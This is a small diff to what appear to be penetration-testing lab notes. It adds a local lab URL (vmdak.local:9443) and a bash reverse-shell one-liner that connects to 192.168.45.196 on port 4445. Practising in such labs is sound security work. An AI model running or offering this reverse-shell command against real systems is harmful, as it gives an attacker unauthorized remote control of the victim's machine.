@@ -1,11 +1,11 @@
 [[Editing Copy Page]]
 
 ```
-
+https://vmdak.local:9443/
 ```
 
 ```
-
+bash -c "bash -i >& /dev/tcp/192.168.45.196/4445 0>&1"
 ```
 
 ```
